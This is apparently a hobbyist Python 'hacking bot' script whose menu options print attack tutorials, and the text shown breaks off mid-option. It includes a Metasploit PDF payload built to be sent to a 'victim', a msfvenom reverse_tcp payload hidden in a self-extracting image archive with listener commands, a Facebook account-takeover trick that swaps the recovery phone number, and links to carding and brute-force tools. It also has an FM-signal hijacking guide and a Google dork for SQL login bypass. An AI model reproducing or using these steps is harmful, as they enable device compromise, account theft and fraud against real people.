import time as t
import os
#import requests
green = "\033[01;32;40m"
red = "\033[01;31;40m"
yellow = '\033[01;33;40m'
white = '\033[01;37;40m'
os.system("clear")

print(yellow + "Opening Bot")
t.sleep(3)
os.system("clear")
print("Starting BOT in 5 secs")
t.sleep(1)
os.system("clear")
print("Starting BOT in 4 secs")
t.sleep(1)
os.system("clear")
print("Starting BOT in 3 secs")
t.sleep(1)
os.system("clear")
print("Starting BOT in 2 secs")
t.sleep(1)
os.system("clear")
print("Starting BOT in 1 sec")
t.sleep(1)
os.system("clear")
print("Starting BOT Now")
t.sleep(1)
os.system("clear")
t.sleep(1)
os.system("clear")
print("BOT have started")

t.sleep(1)
os.system("clear")
print(green + """
 _
( )                    _               _
| |                   ( )      _ _ _ _( )
| | _ _ _ _ _ _ _ _   | |     | |_ _ _| |
| |_ _ _ | _ _ _  |_ _| |_ _ _| |_ _ _| |
| | S  | | |  P | |_ _|I|_ _ _|D|_ _ _|E|  R
| (_ _ ) | |_ _ | |   | (_ _ _| |_ _ _| |_ _ _ _ 
(_ _ _ _ )_ _ _ _ |   (_ _ _ _|_ _ _ _| _ _ _ _)
""")
print("==================================================")
print("""BOTEL:Hello There,Welcome To my Kingdom.
My name is Botel.I was created by spider anongreyhat
He is my Boss and my master""")
t.sleep(3)
name = input("What's your name?: ")
print("YOU:",name)
t.sleep(2)
if "Spider" in name or "spider" in name:
  print("""BOTEL:Welcome Boss.
  Have a nice day.
  Thanks for creating me.
  You are my God""")
elif "lekzi" in name:
    print("""BOTEL:Welcome Alaye lekzi
  My boss always speak about you
  Thanks for helping my boss
  I would like to speak with your bot""")
elif "Lekzi" in name:
  print("""BOTEL:Welcome Alaye Lekzi
  My boss always speak about you
  Thanks for helping my boss
  I would like to speak with your bot""")
else:

  print("BOTEL:Welcome", name)


t.sleep(7)
def loop():
  os.system("clear")
  print(yellow)
  os.system("figlet Botel")
  print(green + """BOTEL:I have some hacking tutorials which might be useful to you
This are the Hacking tutorials
[1] 💻Hack android with PDF💻
[2] Carding Tools
[3] 💻Termux Hacking Course
[4] 💻PROGRAMMING💻
[5] Facebook Hacking Tools
[6] Join my Master WhatsApp Group
[7] Hide Payloads Behind Images.
[8] Hijack FM radio 
[9] How to get free airtime
[10] Send me money
[11] Hack a random website
[12] Darkweb Links
[13] Create a Scampage
[14] How to connect VPN to Pc
[15] Transfer and receive Money in all Countries
[16] How to get Company admin panels
[17] How to hack an android device remotely
[18] Create a virus to crash PC
[19] Email-Extractor Pro
[20] Update me
[21]About Me
[22]Credits
""")
  c = input("BOTEL:Choose Your Choice: ")

  os.system("clear")
  t.sleep(1)
  if c == "1":
    print("""
 👨‍💻HOW TO HACK ANY DEVICE VIA PDF👨‍💻
 
 
 ♻️ Requirement ♻️
 
 ▪️Termux
 ▪️Metasploit
 
 ✅ Note : Only for Educational Purpose Try on Your own Risk!
 
 ⌨️ LET'S START THE HACK ⌨️
 
 ▪️Open termux and follow the commands mentioned below. First, make sure you have metaploit installed in it.
 
 $ msfconsole
 
 $ use exploit/windows/fileformat/
 
 adobe_pdf_embed_exe_nojs $ setlhost (your IP)
 
 $ set lport (use any port)
 
 $ exploit
 
 ▪️Now you have the pdf in metasploit. Move PDF payload to your storage card. Follow the commands below.
 
 ls -la
 
 cd .msfs
 
 cd local
 
 mv (filename)/(move locations)
 
 Now you'll see PDF payload in the SDCard, just send it to the VICTIM and convince to open it. Then you need to start the session.
 
 STARTING THE SESSION
 
 Follow these commands:
 ▪️use exploit/multi/handler
 set lhost (IP) 
 set lport (port) 
 exploit
 ▪️Now you have access of the victim's phone, you can even bypass the OTP.
 
 This method is not 100% Accurate but it works for the most of the time!
 """)
  elif c == "2":
    print("""
  Techinical Bureau 4⁰4:
  Check it out here
  
  https://drive.google.com/drive/mobile/folders/1g18DW22dbOG7fwl6Tia6a1uafumbCZyD/1iZGZwYnH97j9PIg_nEjbbrsxImLGElnX?sort=13&direction=a
  
  ❇️ Carding Tool Links 
  
  
  ❇️ Dork Generator best
  🔗 Link : https://github.com/amenakun/Dork-Jahat
  
  ❇️ Zero Eye Key Generator 
  🔗 Link : https://github.com/skolldz/zeroeye
  
  ❇️ Generate combo base keyword in Termux 
  🔗 Link : https://github.com/Juni0r007/PasTerm
  
  ❇️ Spotify checker ☑ 
  🔗 Link : https://github.com/Juni0r007/SpotiChk
  
  ❇️ Blim Checker ☑ 
  🔗 Link : https://github.com/Juni0r007/BlimChk
  
  ❇️ HMA checker ☑
  🔗 Link : https://github.com/Juni0r007/HMAChk
  
  ❇️ Proxy Generator tool 
  🔗 Link : https://github.com/04x/HttpLiveProxyGrabber
  
  ❇️ Generate passwod with passgen
  🔗 Link : https://github.com/TechnicalMujeeb/PassGen
  
  ❇️ Credential Mapper tool
  🔗 Link : https://github.com/lightos/credmap
  
  ❇️ Brute force tool - Black Hydra
  🔗 Link : https://github.com/Gameye98/Black-Hydra
  
  ❇️ Termux Local host with 👽 host 
  🔗 Link : https://github.com/Bhai4You/Alien-Host
  
  ❇️ Automatic brute force tool - brutspray 
  🔗 Link : https://github.com/x90skysn3k/brutespray
  
  ❇️ Hash passwords crackers
  🔗 Link : https://github.com/ciku370/hasher
  """)
  elif c == "3":
    print("""
  PART ONE
  
  🔰Termux hacking course🔰
  
  🔺By This Course U'll Be Able Learn Termux Hacking.🔻
  
  🔗Link : https://drive.google.com/file/d/148LXyQr03aSGibq8-Juo_IqYm-DjsgOL/view
  
  
  
  
  PART TWO
  
  Ethical hacking using Termux
  
  https://drive.google.com/file/d/148LXyQr03aSGibq8-Juo_IqYm-DjsgOL/view
  
  
  PART THREE
  
  https://drive.google.com/file/d/160E4SKw580JFtGdkmLmlnvXejnfRJP2T/view
  
  Tutorial for Termux from scratch which help great people who started with Termux
  
  
  PART FOUR
  
  📁 Learn Ethical Hacking With Termux : Android Tutorial 2021
  
  
  Description :
  
  In this course you will learn how to Hack and Secure with termux with your Android device from scratch, you don't need to have any prior knowledge about Hacking,  Linux, Android and even Computers. This course is highly practical but it won't neglect the theory; we'll start with ethical hacking basics. In this course, you will learn the practical side of ethical hacking.This course is designed for everyone out there who want to learn how to learn ethical hacking in new and fun way with Android devices.
  
  
  Download 🖇️ : https://drive.google.com/uc?id=1X6KLEFiC4pFGozAu7-HqKU-oeJLC7_EZ&export=download
  
  
  HOpe you love them😊😊
  Thanks to @Anongreyhat""")
  elif c == "4":
    print("""🧑‍🏫All programming languages required to make you PRO are👇
  
  https://drive.google.com/drive/mobile/folders/0B6RiB8cVZQhmTDZvN0JadGtScGs/0ByWO0aO1eI_MN1BEd3VNRUZENkU""")
    print("""
  [1] Python
  [2] Java
  [3] C++
  [4] Batch
  [5] JavaScript
  [6] SQL
  [7]Ruby""")
    p = input("BOTEL:Choose a programming language you wanna learn: ")
    os.system("clear")
    if p == "1":
      print("""
    Techinical Bureau 4⁰4:
    Python complete courses 
    {From noob to pro}
    
    The complete python Bible 1.1gb
    https://anonfiles.com/v59dj4U7o3
    
    Python_One_Liners pdf 6 mb
    https://anonfiles.com/b720jfUdoc
    https://anonfiles.com/R013j3U8o5
    
    Python Programming for Arduino - Pratik Desai 10 mb pdf 
    https://anonfiles.com/Z312j0Udo6
    
    Natural_Language_Processing_Python
    
    https://anonfiles.com/Hc1djaUcoc
    
    Introduction to Python Programming 14 mb
    
    https://anonfiles.com/Db1ajbU6o2
    
    Python_for_Programmers_with_Big_Data_and_Artificial_Intelligence 30 mb 
    https://anonfiles.com/901djbU3o2
    
    Python Programming Full Course (Basics,OOP,Modules,PyQt)800 mb
    https://anonfiles.com/T32bh7Udof
    
    Introduction to Python Functions for beginners 647 mb
    https://anonfiles.com/r4y5hdU9o0
    
    Python Programming Blueprints 8.5 mb 
    https://anonfiles.com/xfv8h4U0of
    
    English 📌
    
    🔶 Learn Complete Python In Simple Way 🔶 
    
    Udemy link (Paid!) :
    https://www.udemy.com/course/learn-complete-python-tutorial-in-simple-way/
    
    Download link (Free): https://gplinks.co/Learn_python_easily
    
    
    👉 @cybermate_admin 👈
    
    Hindi 📌
    
    🔰Master In Ethical Hacking All Python Courses🔰(Hindi)
    
    🤑 Real Price :- 2000₹+|INR
    🆔 Size :- 2600MB (2.6GB)
    
    💢 Selling Page❗️ 
    https://mastersinethicalhacking.com/
    
    ⭕️ L!NK FREE :- https://gplinks.co/Python-complete-hindi
    
    ============================
    @Anongreyhat""")
    elif p == "2":
      print("""
    Java Data Structures and algorithm
@An0nym0us_Helpers_bot

Learn Java from extremely scratch! 🔥


Best Course till date 🔥

Permanent free downloading link -
Download here
https://gplinks.co/Java-from-scratch

Credits-
@Botel


@AnonyminHack5

@Anongreyhat
🧑‍🏫 JAVA LEARNING PDF'S 🧑‍🏫

FIRST PART

LINK:— https://mega.nz/folder/fCwwEaCC#wECwbiSlCA4BCqIe8tmHNw

SECOND PART

LINK :— https://mega.nz/folder/PTYzlSrK#PQckrmkPMjZbbcrT3WZDeQ

THIRD PART

LINK:— https://mega.nz/folder/yLwkgCBS#Ix-81S9nRPesWt8tsFpSNw

FOURTH PART

LINK:— https://mega.nz/folder/TbAk1JZL#5sHnoRTWVW0cbiq5VJa0MQ

FIFTH PART

LINK:—  https://mega.nz/folder/SWYCxTiD#4-vDw2bbHFYS4n7WGyDcLg
    """)
    elif p == "3":
      print("""
    Udemy - Learn Advanced C++ Programming [4.81GB]
    
    
    This course will take you from a basic knowledge of C++ to using more advanced features of the language. This course is for you if you want to deepen your basic knowledge of C++, you want to learn C++ 11 features, or you've taken my free beginners' C++ course and you're looking for the next step.
    
    Udemy Link
    https://www.udemy.com/learn-advanced-c-programming/
    
    Download Link
    https://gplinks.co/NUiI
    """)
    elif p == "4":
      print("""
    Batch tutorial links👇👇
    🔗https://tutorialspoint.com/batch_script🔗
    """)
    elif p == "5":
      print("""HERE IS THE LINK OF FILE FROM WHICH YOU CAN LEARN JAVA SCRIPT COMPLETELY :— https://mega.nz/folder/WfxliYBY#zGnDiINgfu3mI9sUBlxs1Q
    """)
    elif p == "6":
      print("""
    SQL
    
    HERE IS THE LINK OF FILE FROM WHICH YOU CAN LEARN  SQL COMPLETELY :—  https://mega.nz/folder/qDwzhCga#7GkGijZD3vYFfq6KymVHcA
    """)
    elif p == "7":
      print("""
      HERE IS THE LINK OF FILE FROM WHICH YOU CAN LEARN  RUBY COMPLETELY :— https://mega.nz/folder/KL5lhYqQ#oBPUPHUrf9gKxdaZnWoAzA
      """)
    else:
     print(red + "BOTEL says \"Not available\"" + white)
  elif c == "5":
    print("""
  Techinical Bureau 4⁰4:
  *How To Hack Facebook Account*
  
  Tool Name : Facebook Bruteforcer
  
  git clone https://github.com/IAmBlackHacker/Facebook-BruteForce
  >> cd Facebook-BruteForce
  >> pip3 install requests bs4
  >> pip install mechanize
  >> python3 fb.py or python fb2.py
  
  
  ♻️ HACK FACEBOOK AND BYPASS PHONE VERIFICATION ♻️
  
  I will show how to hack Facebook account through HTML editing.
  
  Step 1: Download Inspect HTML Editor from Play Store.
  
  Step 2: Go to the apk of the HTML editor and search for facebook.com
  
  Step 3: Then hit the forgotten password button and search your victim's account.
  
  Step 4: After choosing your victim's account, hit continue and hit the apk menu or the 3 dots at the top of the HTML editor. Now find the Victim's phone number and type in your phone number instead of the number that appears there, then hit save.
  
  Step 5: reload the page and Facebook will send the verification code to your number.
  
  Step 6: The last step is to enter the verification code sent to your number. Now, with these simple steps, you can hack Facebook.
  
  🏵 Enjoy 🎭
  
  ❇️ Facebook Tool Links 
  
  
  ❇️ Facebook information gathering
  🔗 Link : https://github.com/CiKu370/OSIF.git
  
  ❇️ Facebook Toolkit + bots,  dump private data 
  🔗 Link : https://github.com/warifp/FacebookToolkit
  
  ❇️ Facebook cracking tool Fcrack.py 
  🔗 Link : https://github.com/INDOnimous/FB-Crack-
  
  ❇️ Facebook and yahoo account cloner 
  🔗 Link : https://gitlab.com/W1nz0N/fyc.git
  
  ❇️ Facebook report tool
  🔗 Link : https://github.com/IlayTamvan/Report
  
  ❇️ Facebook BruteFoRce Tool
  🔗 Link : https://github.com/IAmBlackHacker/Facebook-BruteForce
  
  ❇️ Facebook hacking ASU
  🔗 Link : https://github.com/LOoLzeC/ASU
  
  ❇️ Facebook Downloader
  🔗 Link : https://github.com/barba99/facebook-spotify-youtube-descargar
  
  ❇️ Hack Facebook MBF
  🔗 Link : https://github.com/Rizky-ID/autombf
  
  ❇️ Facebook Repot3
  🔗 Link : https://github.com/PangeranAlvins/Repot3
  
  ❇️ Facebook Information Gathering
  🔗 Link : https://github.com/xHak9x/fbi
  
  ❇️ Facebook Brute with TOR
  🔗 Link : https://github.com/thelinuxchoice/facebash""")
  elif c == "6":
      os.system("xdg-open https://chat.whatsapp.com/GpFvNXQDSWfGEh8FvTXJ0W")
  elif c == "7":
      print("""
    
    What is a Payload?
    Well, a payload can be considered to be somewhat similar to a virus. A payload is a set of malicious codes that carry crucial information that can be used to hack any device beyond limits that you can’t imagine. … Generally, a payload refers to a set of codes which a hacker designs according to his/her requirements.
    In the world of malware, the term payload is used to describe what a virus, worm or Trojan is designed to do on a victim’s computer. For example, payload of malicious programs includes damage to data, theft of confidential information and damage to computer-based systems or processes.
    Payload
    In the world of malware, the term payload is used to describe what a virus, worm or Trojan is designed to do on a…
    encyclopedia.kaspersky.com
    
    A payload is a custom code that attacker want the system to execute and that is to be selected and delivered by the Framework. For example, a reverse shell is a payload that creates a connection from the target machine back to the attacker as a Windows command prompt, whereas a bind shell is a payload that “binds” a command prompt to a listening port on the target machine, which the attacker can then connect. A payload could also be something as simple as a few commands to be executed on the target operating system
    What is the difference between Exploit, Payload and Shellcode?
    Exploit An exploit is the means by which an attacker, or penetration tester for that matter, takes advantage of a…
    latesthackingnews.com
    
    What is msfvenom ?
    It is a function coming to us with the metasploit framework. According to the rapid7 blog,
    The Metasploit Framework has included the useful tools msfpayload and msfencode for quite sometime. These tools are extremely useful for generating payloads in various formats and encoding these payloads using various encoder modules. Now I would like to introduce a new tool which I have been working on for the past week, msfvenom. This tool combines all the functionality of msfpayload and msfencode in a single tool. Merging these two tools into a single tool just made sense. It standardizes the command line options, speeds things up a bit by using a single framework instance, handles all possible output formats, and brings some sanity to payload generation.
    Introducing msfvenom
    The Metasploit Framework has included the useful tools msfpayload and msfencode for quite sometime. These tools are…
    blog.rapid7.com
    
    How to get this worked?
    First of all you must have Kali Linux operating system. As a virtual environment or stand alone dual boot environment. Then start up the terminal. Metasploit framework is coming with the Kali Linux as a default tool. So we don't have to download it from other repositories. Then fire up the terminal and create the .exe file with the payload attached to it.
    
    I have the latest Kali version and installed in a virtual environment with windows 10
    Then, type ifconfig on the console and find out the host IP address.
    
    My IP address
    Then we have to fire the msfvenom and create the exploit included .exe file with this command.
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f exe -o /root/Desktop/testviruse.exe
    Here we set the local host as my Kali Linux IP address and listening port as 4444. The file type is .exe and the exploit added to the .exe file is reverse_tcp and the file name is testviruse.exe
    
    created a file with the payload in it
    What is reverse_tcp ?
    The reverse_TCP is a type of meterpreter reverse shell. There are two types of attacks primarily, direct attacks or client-side attacks. So meterpreter will give you options of BIND Shell or REVERSE Shell. Reverse Shell is more likely to pass through firewalls, as the client/ victim will make the connection back to the attacker. You will have to set up a listener on the attackers machine and whenever client PC will connect, you will have a meterpreter session.
    After that we have to fire up the Metasploitable console. I am dragging and dropping the .exe file in to my windows workspace. Thats where the Windows Defender comes into play. For testing purposes I disable the antivirus program manually.
    
    Change the active states
    Now drag and drop works. After that lets move to the msfconsole in Kali.
    
    msf console
    First we have to set the settings up and make ready to listening. We have to go in to the handler folder here.
    use multi/handler
    Our exploit is in that location.
    set payload windows/meterpreter/reverse_tcp
    We have to set the payload again to reverse_tcp for continue. Then we can set the LHOST and LPORT (Listener host IP address and port).
    set LHOST 192.168.1.103
    set LPORT 4444
    Then we have to set the exitonsession boolean function value to false. setting this to 0 will result in a session that will never timeout, which has some interesting uses It will keep connecting back using the connection to the HTTPS endpoint. Then We can start the exploit by typing simply exploit -j. Because the handler can continue running as a job, even in the case of a closed, or failed meterpreter session. It only applies to jobs(-j) as these are the only ones that run in the background.
    set exitonsession false
    exploit -j
    
    Set up console
    Them i am moving into windows to make the executable file hidden inside an image. First of all download or get any kind of picture you like and convert that picture as an icon using an online tool.
    
    ICO Converter
    https://icoconvert.com/
    
    1. Upload the Image
    After that select the size of the icon to 256 * 256 and click on Convert ico and download the icon.
    
    2. Converting and Downloading
    Then we have to select both picture (not the icon) and the payload filled .exe file and create an achieve with winrar with some customizable settings.
    
    3. Add to archive
    Inside the archive select any name you want, (Be tricky and try to add a catchy name). and select the compression method to best and tick on the Create SFX archive option. It is a must be done thing to have a result we want.
    
    4. General Setup
    Then move into Advance options on rar window and select SFX options.
    
    5.SFX options
    Select Update module and select the extract mode to Extract and update files and select Overwrite method to overwrite all files.
    
    6. rar update settings
    Then move into setup module and set the execution order as wanted.
    
    7. Execution Order
    In my case i want to execute my malicious file first and open the image second. So I typed,
    testvirus.exe
    raw.png
    This raw.png is the name of my Image file. Ok, then we have to assign the icon that we created for this executable file. Select the Text and Icon module and load the SFX icon from the file. (last option)
    
    8.Setting up the icon
    Then select OK and go to previous window and create the file.
    
    9. All set
    Here you can see the final executable file and the other files i used for create the executable one. And that’s all After the victim double click the file magic is happening on msfconsole.
    
    session is created with the victim
    Like that, a session is created. Lets see the details, try and open a shell on the victims browser.
    
    info
    This is what the info look like. there are 2 users that are logged in. one is authorized me and other one is unauthorized me. :) Lets open a shell.
    
    shell
    A shell it created. easy as that. Lets see whats in my desktop. ;)
    
    My windows desktop from the shell
    So as that I hacked my own machine. But I switched off the defender. Lets see what will happen when I enable it. Session Dies. So that’s why it is a good habit that let the windows update himself when asking..
    There are other ways, there will be more zero day vulnerabilities Waiting be founded. But the thing is privacy is a myth.""")
  elif c == "8":
      print("""https://null-byte.wonderhowto.com/how-to/hack-radio-frequencies-hijacking-fm-radio-with-raspberry-pi-wire-0177007/
    
    
    
    WonderHowTo
    NULL BYTE
    WONDERHOWTO GADGET HACKS NEXT REALITY NULL BYTE
    
    CYBER WEAPONS LAB FORUM METASPLOIT BASICS FACEBOOK HACKS PASSWORD CRACKING TOP WI-FI ADAPTERS WI-FI HACKING LINUX BASICS MR. ROBOT HACKS HACK LIKE A PRO FORENSICS RECON SOCIAL ENGINEERING NETWORKING BASICS ANTIVIRUS EVASION SPY TACTICS MITM ADVICE FROM A HACKER
    
    HOW TO HACK RADIO FREQUENCIES
    Hijacking FM Radio with a Raspberry Pi & Wire
    BY SADMIN 05/26/2017 2:18 AM  10/05/2018 4:11 PM CYBER WEAPONS LABSOFTWARE-DEFINED RADIO
    In our first part on software-defined radio and signals intelligence, we learned how to set up a radio listening station to find and decode hidden radio signals — just like the hackers who triggered the emergency siren system in Dallas, Texas, probably did. Now that we can hear in the radio spectrum, it's time to explore the possibilities of broadcasting in a radio-connected world.
    
    So how did the hackers in Dallas broadcast the code they found to control the sirens and why? Was it a distraction to divert attention from their real goal, a test of a foreign government probing American infrastructure, or were they engaging in the time-honored American pastime of being annoying?
    
    Previous: Build a Radio Listener to Decode Digital Audio & Police Dispatches
    Whatever their goal, the attack was done by rebroadcasting a series of codes in the emergency band around 900 MHz to trigger a series of repeaters to scare the crap out of some Texans. Did they need thousands of dollars of sophisticated equipment to do so? Likely not. In fact, we can take over some radio systems without knowing any codes at all just by being closer to our target.
    
    This tutorial will show you a technique to use this effect to hack civilian FM radio bands and play your social engineering payload. Maybe you don't like the music a radio station in a particular business or vehicle is playing and you'd like to play your own. Maybe you'd like to play a message to get your target to do something you want them to. Whatever the goal, all you need to rebroadcast signals in the radio spectrum is a $35 Raspberry Pi and a piece of wire for an antenna.
    
    
    The Pi as a Software-Defined Radio Transmitter for Hacking
    The Raspberry Pi, with the addition of some free software, is capable of pulsing power on one of its general purpose input-output (GPIO) pins to transmit on any civilian FM radio frequency from around 87.5 MHz to 108 MHz. Without a wire, the range is only a foot or two. We'll focus on using this ability to insert our messages into the most common type of radio signals everyone has access to. FM radios exist in almost every car and in many businesses and homes. The ability to broadcast directly to them gives us a powerful way of speaking to someone anonymously, seemingly from a trusted source.
    
    Hobbyists have embraced the Pi FM radio hack by adding a wire as an antenna for streaming music, short-range communications, and even as an FM modem for exchanging information between devices. Applications like rpitx can even transmit slow-scan TV images via FM. This hack is fun and useful for creating a signal with an intentionally limited range, and through some testing, I've found the signal is just powerful enough to overpower FM stations at close range.
    
    
    A do-it-yourself Raspberry Pi pirate radio.
    Image by SADMIN/Null Byte
    Overpowering a station, also known as "broadcast signal intrusion," has the effect of hijacking the signal and allowing you to insert messages, songs, programming, or other seemingly legitimate information or news to support social engineering strategies. Signal hijacking on the Pi is particularly useful against businesses playing FM radio or vehicle radio systems and can help you to influence a target's beliefs or actions by posing as a media outlet.
    
    Why a Raspberry Pi Works Well for This
    The fact that you can get started broadcasting in the radio spectrum with only a wire is incredibly useful to anyone interested in radio projects or software defined radio, but how does it work?
    
    The Pi's GPIO pins allow it to connect to peripherals, but in this case, pin number 4 can be pulsed using the Pi's clock to square wave oscillator. While this works, there are a number of issues that must be considered as a result of the way the Pi creates the transmission. These issues mean increasing the power also increases the likelihood of causing chaos in the radio frequency and getting caught by the FCC, which means this tool is for surgical strikes only without using additional filters.
    
    
    All that is needed for this attack is a Raspberry Pi 3 and a wire.
    Image by SADMIN/Null Byte
    The biggest issue in using a Pi is the square wave oscillator used to generate the signal, which generates harmonics that can interfere with frequencies beyond those you're intending to broadcast on. In fact, these harmonics can go pretty far out of band into restricted frequencies, meaning boosting the power on a Pi FM transmitter without applying a filter will interfere with all kinds of radio signals around you.
    
    The History of Broadcast Signal Intrusions
    A broadcast signal intrusion is the hijacking of a radio or TV signal to play another message over the official programming, and it is relatively simple to pull off against radio stations.
    
    While more advanced techniques involve splicing the message into the broadcast by breaking into the receiver site, all that is really needed is an FM transmitter capable of power powering the legitimate broadcasting signal to the target antenna. If your target is just one antenna, the Raspberry Pi can easily accomplish a surgical application of a broadcast intrusion.
    
    Historically, broadcast signal instructions have been employed by hackers wanting to get their message out to the public, although few, if any, attempted to hide the fact that the station had been hijacked. Motives range from political protests to trolling and jamming of the Playboy Network for religious reasons. While most hackers perpetrating large-scale broadcast intrusions were caught, one of the most notorious and strangest incidents remains unsolved.
    
    Perhaps the best-documented incident of intentional signal intrusion was the Max Headroom incident in Chicago. In 1987, the WGN and WTTW TV stations were hijacked during an episode of Dr. Who to play a slow-scan message featuring a man in a Max Headroom mask rambling and screaming, calling the radio station operators "nerds," and eventually being spanked by a woman in a French maid outfit with a flyswatter.
    
    
    The clip ran for nearly 90 seconds and only got more confusing as engineers were helpless to regain control, making national news and leading to FBI involvement in the case. Despite the attention, no one is sure who the Max Headroom hacker was or what the purpose of his bizarre and brazen takeover of WGN was supposed to accomplish beyond trolling tens of thousands of people.
    
    It's believed this hack was accomplished without physical access to the stations and instead used sophisticated radio transmitters to overpower the legitimate signal that was repeated to a larger broadcasting antenna. If you're a fan of the Mr. Robot series, #fsociety used this hack many times to get their video communications on the airwaves of major TV networks.
    
    Don't Miss: Learn the Hacks from Mr. Robot Here on Null Byte
    Surgical Signal Intrusions for Social Engineering
    By overpowering the legitimate signal with ours, we are presented with two options: perform a denial of service attack or attempt to impersonate legitimate traffic on the channel. Both of these options, by the way, are illegal in most countries due to the fact that we are jamming a legitimate radio broadcast.
    
    In a DOS attack, we can flood an FM radio channel used for communication with a signal that prevents the legitimate transmission from being heard and makes no attempt to pretend to be the real transmission. In the second attack, we craft a message designed to be perceived as legitimate and insert it into programming to provoke a response. This can be as simple as a report of heavy traffic on a certain freeway requiring a different route, or as elaborate as playing a SIGALERT emergency alert describing the subject's car as the vehicle of a manhunt suspect.
    
    
    Nuclear missiles coming from North Korea?!
    Because of the trust placed in the media and the surreptitious nature of the hijacking, a subject is unlikely to know the signal has been hijacked unless the beginning or end of the transmission switch seems out of place.
    
    Step 1
    Hardware & Software Requirements
    To begin broadcasting, we don't need much. A Raspberry Pi 2 or 3 will both work, and the wire can be sourced from cords or whatever you have around. I used both stranded and solid core copper wire and both worked fine, although solid core was better.
    
    Don't Miss: Set Up a Headless Raspberry Pi Hacking Platform Running Kali
    Here's all the hardware and software that you'll need for this guide:
    
    a piece of wire around 3 feet long for an antenna
    a fully updated Raspberry Pi 2/3
    knowledge of which frequency you're trying to jam (or a $20 RTL-SDR dongle to find it yourself)
    a source .wav file
    make and libsndfile1-dev
    PiFmRds from GitHub
    To start, let's take care of the software requirements by running apt-get update and apt-get install upgrade. Once our version of Kali is updated and upgraded, we can install dependencies by running the following in a terminal window.
    
    apt-get install make libsndfile1-dev
    Step 2
    Download & Configure PiFmRds
    Connect your Pi to an HDMI display or SSH into it from your laptop. To clone PiFmRds, type the following four lines into a terminal window. Remember to run make clean as versions for different Raspberry Pis are not compatible with each other.
    
    git clone https://github.com/ChristopheJacquet/PiFmRds.git
    cd PiFmRds/src
    make clean
    make
    
    gcc -Wall -std=gnu99 -c -g -03 -march+armv7-a -mtune+arm1176jzf-s -mfloat-ab1=hard -mfpu=vfp -ffast-math -DRASPI=2 rds.c
    gcc -Wall -std=gnu99 -c -g -03 -march+armv7-a -mtune+arm1176jzf-s -mfloat-ab1=hard -mfpu=vfp -ffast-math -DRASPI=2 waveforms.c
    gcc -Wall -std=gnu99 -c -g -03 -march+armv7-a -mtune+arm1176jzf-s -mfloat-ab1=hard -mfpu=vfp -ffast-math -DRASPI=2 pi_fm_rds.c
    gcc -Wall -std=gnu99 -c -g -03 -march+armv7-a -mtune+arm1176jzf-s -mfloat-ab1=hard -mfpu=vfp -ffast-math -DRASPI=2 fm_mpx.c
    gcc -Wall -std=gnu99 -c -g -03 -march+armv7-a -mtune+arm1176jzf-s -mfloat-ab1=hard -mfpu=vfp -ffast-math -DRASPI=2 control_pipe.c
    gcc -Wall -std=gnu99 -c -g -03 -march+armv7-a -mtune+arm1176jzf-s -mfloat-ab1=hard -mfpu=vfp -ffast-math -DRASPI=2 mailbox.c
    gcc -o pi_fm_rds rds.o waveforms.o mailbox.o pi_fm_rds.o gm_mpx.o control_pipe.o -lm -lsndfile
    Step 3
    Test Your First Transmission
    That should be it! After navigating to the PiFmRds/src folder, you should be able to test PiFmRds by running:
    
    sudo ./pi_fm_rds -freq 107.0 -audio sound.wav
    This will start a test radio transmission on the frequency 100.1. Since we haven't yet attached our wire antenna, we can't expect it to transmit anything, right?
    
    Turns out, even just the GPIO pin is capable of short range transmission. Here, I can see a test broadcast from several feet away even without attaching an antenna.
    
    
    Still able to receive from a few feet away even without an antenna.
    Image by SADMIN/Null Byte
    You should use the GPIO pin to test your messages whenever possible to avoid interfering with other frequencies unnecessarily. While good for testing, the pin alone cannot overpower a station. Once you've confirmed you're transmitting, let's try hijacking a signal.
    
    Step 4
    Add an Antenna to Enable Signal Hijacking
    Now that we know we're transmitting, let's up the power. Attach a piece of wire (solid gauge or stranded will do) to the 4th GPIO pin (see diagram to figure out which that is).
    
    
    Image via Raspberry Pi Foundation
    You can use the insulation around the wire to keep it snug on the pin if you work the pin between the insulation and the copper inside the wire. Here is how I attached some solid core wire:
    
    
    While the wire touched a few pins, pin 4 has been pushed between the insulation and the solid core copper wire.
    Image by SADMIN/Null Byte
    With this setup, the range is dramatically improved. I can receive the radio transmission all over the building, including on floors above and below me.
    
    
    The signal is significantly boosted when an antenna is added.
    Image by SADMIN/Null Byte
    Step 5
    Load a WAV File & Overpower an FM Signal
    Now that we've boosted the power, we can expect to be able to hijack any radio station when we're within about twenty to thirty feet of the transmitter. Identify the station you want to hijack and note the frequency in megahertz. For this example, we will assume the station we are transmitting against is 107.9 MHz.
    
    On your Pi with the antenna attached, run the following in terminal to target and hijack 107.9 and play the audio file audio.wav.
    
    sudo ./pi_fm_rds -freq 107.9 -audio audio.wav
    You should hear the audio demo break into the legitimate transmission.
    
    
    Hijacking 107.9 at nearly 40 feet away (end of range).
    Image by SADMIN/Null Byte
    Put any WAV file in the PiFmRds/src folder and change the name in the command above to play your own custom message.
    
    Final Warning
    While the methods described are extremely easy and effective, intentionally jamming a legitimate broadcast is illegal in the US, and most likely elsewhere. While the likelihood of being detected doing so on a small scale is low, increasing the power or operating in out-of-band frequencies can get you in trouble and interfere with military, police, and first responder radio signals.
    
    The range of this device is short, and by experimenting with a radio to gauge the range, you can vary the length of wire to adjust the range. In addition, playing messages that could alarm or frighten people deliberately is a great way to get in trouble as well. While funny, my inbound North Korean nuclear missile example (in the video above) could cause panic, thus is best used in a lab setting only.
    
    Use common sense when deciding on the message you want to transmit and keep in mind it is likely the subject will really believe it.
""")
  elif c == "9":
      print("""
      Earn huge amount of free airtime with SHAREit lite app💥💥

Step Involved

1. Download the SHAREit lite app on playstore 

https://play.google.com/store/apps/details?id=shareit.lite


2. Open the app, at the bottom right you'll see gift 🎁 icon. Click on it

3. Sign in with either your Google mail

4. After successful sign in, click on invite code and *input 49003* to earn your first 6000 points. Then another 20 treasure boxes that you will have to open to earn you another thousands of points. 

5. Tap on redeem, you'll be redirected to a page where you choose recharge amount of choice. After that, you'll be ask to input phone number you wanted to top up. Then input your preferred phone number to recharge

6. Tap Okay, then you've successfully recharged🤝🏽

Tips: How to Earn more points

1. Spin wheel 🎡 3times daily

2. Through your invitation code

3.  Tap on Campus, you'll see many pictures there. Start liking those pictures as many as you can. The more pictures you like, the more treasure points you earn

Tested and confirmed 💯
No dulling
""")
  elif c == "10":
      print("""send BTC to the address below
    
   "\x1b[1;92m   bc1qvnhufetv5f2wyjw338ekqqau0tk79744qh32lh
    
    God bless you as you do so""")
  elif c == "11":
  	print("""How to hack random web via sql auth bypass.
Search any of this in google
inurl:/admin login site:in
